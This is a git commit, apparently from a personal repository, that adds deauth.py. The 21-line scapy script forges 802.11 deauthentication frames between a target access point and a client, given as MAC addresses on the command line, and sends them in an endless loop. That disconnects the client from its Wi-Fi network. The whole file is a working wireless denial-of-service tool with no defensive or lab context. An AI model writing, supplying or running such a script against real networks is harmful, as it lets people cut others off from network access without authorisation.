05393a9a804440839b2cba0fa30a24c1540c0f8c
ohadcohen1111 <57725202+ohadcohen1111@users.noreply.github.com>
2020-10-13 12:44:40 -0400

    Create deauth.py

---
+++ deauth.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python
+
+import sys
+
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
+from scapy.sendrecv import sendp
+from scapy.all import *
+
+
+interface=sys.argv[1]
+device_target=sys.argv[2]
+client_target=sys.argv[3]
+
+print ('Deauthing',client_target,'from',device_target,'...')
+pkt1 = RadioTap() / Dot11(addr1=client_target, addr2=device_target, addr3=device_target) / Dot11Deauth()
+pkt2 = RadioTap() / Dot11(addr1=device_target, addr2=client_target, addr3=device_target) / Dot11Deauth()
+
+while True:
+	sendp(pkt1, iface=interface)
+	sendp(pkt2, iface=interface)
+	print("----------------------Send Packets----------------------")
